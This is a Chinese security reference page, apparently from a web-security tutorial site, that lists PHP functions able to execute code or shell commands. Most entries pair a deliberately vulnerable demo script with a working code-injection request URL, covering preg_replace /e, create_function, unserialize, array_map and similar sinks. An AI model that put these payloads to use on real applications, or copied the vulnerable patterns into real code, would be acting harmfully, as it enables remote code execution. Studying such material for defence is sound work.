---
layout: default
---
# ![](../img/hj.jpg)php中可以执行代码的函数


## ![](../img/github1.png)eval()
```
demo code 1.1:
<?php
echo `dir`;
?>

eval(" phpinfo(); ");【√】
eval(" phpinfo() ");【X】
assert(" phpinfo(); ");【√】
assert(" phpinfo() ");【√】
```
## ![](../img/github2.png)assert()
```
demo code 1.1:
<?php
echo `dir`;
?>

eval(" phpinfo(); ");【√】
eval(" phpinfo() ");【X】
assert(" phpinfo(); ");【√】
assert(" phpinfo() ");【√】
```
## ![](../img/github3.png)双引号
php中双引号是可以正常解析的（单引号不可以）
举例：
```
<?php $a=1;echo "$a";?>
```
会输出1，而不是$a
## ![](../img/github4.png)preg_replace()代码注射
正则匹配代码注射
众所周知的preg_replace()函数导致的代码注射。当pattern中存在/e模式修饰符（可通过/e%00截断），即允许执行代码。这里我们分三种情况讨论下
1、preg_replace() pattern 参数注射
pattern即第一个参数的代码注射。
当magic_quotes_gpc=Off时，导致代码执行。
demo code 3.1:
```
<?php
echo $regexp = $_GET['reg'];
$var = '<php>phpinfo()</php>';
preg_replace("/<php>(.*?)$regexp", '\\1', $var);
?>
访问http://127.0.0.1/preg_replace1.php?reg=%3C\/php%3E/e 即
执行phpinfo()。
```
2、 preg_replace() replacement参数注射
replacement即第二个参数的代码注射，导致代码执行。
demo code 3.2:
```
<?
preg_replace("/menzhi007/e",$_GET['h'],"jutst test");
?>
当我们提交 http://127.0.0.1/preg_replace2.php?h=phpinfo() 即
执行phpinfo()。
```
3、 preg_replace()第三个参数注射
我们通过构造subject参数执行代码。
```
提交：http://127.0.0.1/preg_replace3.php?h=[php]phpinfo()[/php]

或者 http://127.0.0.1/preg_replace3.php?h=[php]${phpinfo%28%29}[/php] 导致代码执行
```
demo code 3.3:
```
<?
preg_replace("/\s*\[php\](.+?)\[\/php\]\s*/ies", "\\1", $_GET['h']);
?>
```
## ![](../img/github5.png)create_function()
动态函数代码执行
```
<?php
$foobar = $_GET['foobar'];
$dyn_func = create_function('$foobar', "echo $foobar;");
$dyn_func('');
?>

我们提交 http://127.0.0.1/create_function.php?foobar=system%28dir%29 执行dir命令
```
## ![](../img/github6.png)call_user_func()
```
<?php
$b="phpinfo()";
call_user_func($_GET['a'],$b);
?>
当请求1.php?a=assert的时候，则调用了assert函数，并将phpinfo作为参数传入
```
## ![](../img/github7.png)call_user_func_array()

## ![](../img/github8.png)array_map()
```
<?php
$evil_callback = $_GET['callback'];
$some_array = array(0, 1, 2, 3);
$new_array = array_map($evil_callback, $some_array);
?>

我们提交 http://127.0.0.1/array_map.php?callback=phpinfo 即执行phpinfo()。
```
## ![](../img/github9.png)unserialize()
```
unserialize（）是PHP中使用率非常高的函数。不正当使用unserialize（）容易导致安全隐患。

<?php
class Example {
var $var = '';
function __destruct() {
eval($this->var);
}
}
unserialize($_GET['saved_code']);

?>
我们提交 http://127.0.0.1/unserialize.php?saved_code=O:7:%22Example%22:1:{s:3:%22var%22;s:10:%22phpinfo%28%29;%22;} 即执行phpinfo()。
```
## ![](../img/github10.png)ob_start()
```
ob_start()函数的代码执行
<?php
$foobar = 'system';
ob_start($foobar);
echo 'dir';
ob_end_flush();
?>
```
## ![](../img/github11.png)system()
```
<?php system('whoami');?>
```
system()会直接回显打印输出，不需要echo
## ![](../img/github12.png)反引号（`）
```
<?php echo `whoami`;?>
```
实际上反引号也是调用shell_exec()
## ![](../img/github13.png)exec()

## ![](../img/github14.png)shell_exec()
## ![](../img/github15.png)passthru()
## ![](../img/github16.png)pcntl_exec()
需要额外安装，
格式：pcntl_exec(string $path [,array $args [,array $envs]])，其中：
```
$path：为程序路径，如果是perl或bash脚本，则需要在文件头加上#!bin/bash来标识路径，
$args：标识传递给$path程序的参数，
$env：是执行这个程序的环境变量
```
## ![](../img/github17.png)popen()
```
<?php popen('whoami >>D:/2.txt','r');?>
```
第一个参数是命令，第二个参数是指针文件的连接模式，有r和w代表读和写

## ![](../img/github18.png)proc_open()
popen()和proc_open()不会直接返回执行结果，而是返回一个文件指针，但是命令是已经执行了
## ![](../img/github19.png)escapeshellcmd()
## ![](../img/github20.png)file_put_contents()
## ![](../img/github21.png)fwrite()
## ![](../img/github22.png)fputs()


__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
